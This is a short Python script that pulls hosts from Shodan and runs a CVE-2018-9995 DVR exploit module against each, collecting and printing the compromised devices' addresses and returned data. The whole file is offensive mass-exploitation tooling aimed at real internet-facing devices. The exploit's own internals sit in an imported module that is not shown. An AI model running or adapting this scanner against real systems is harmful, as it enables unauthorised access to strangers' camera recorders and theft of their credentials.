import shodan_gather as sg
import cve_2018_9995 as dvr

class Exploit:
    def __init__(self):
        self.gather = sg.Gather()
        self.dvr = dvr.CVE_2018_9995()
        self.dorks = []
    def run(self):
        
        for host,port in self.gather.gather():
            dork = self.dvr.run(host=host, port = port)
            if dork:
                self.dorks.append(dork)
    def display_dorks(self):
        print("数量：",len(self.dorks))
        for dork in self.dorks:
            print("    ", "http://"+dork[0]+":"+str(dork[1]), "\t", dork[2])

exp = Exploit()
exp.run()
exp.display_dorks()
